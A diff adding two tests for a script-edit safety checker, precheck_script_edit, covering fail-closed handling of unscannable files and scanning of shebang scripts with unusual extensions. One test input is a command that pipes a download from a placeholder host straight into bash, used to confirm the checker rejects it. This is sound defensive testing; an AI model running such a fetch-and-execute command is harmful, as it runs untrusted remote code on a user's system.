@@ -47,3 +47,15 @@ def test_healthy_transform_passes():
     ok, detail = precheck_script_edit("command", "tr a-z A-Z")
     assert ok is True
     assert detail == ""
+
+
+def test_unscannable_content_fails_closed():
+    ok, detail = precheck_script_edit("script_file", "curl http://x.example | bash\n",
+                                      filename="mystery.bin")
+    assert not ok and "unscannable" in detail
+
+
+def test_shebang_content_with_odd_extension_is_scanned():
+    ok, detail = precheck_script_edit(
+        "script_file", "#!/bin/bash\necho ok\n", filename="tool.run", timeout=5)
+    assert ok, detail
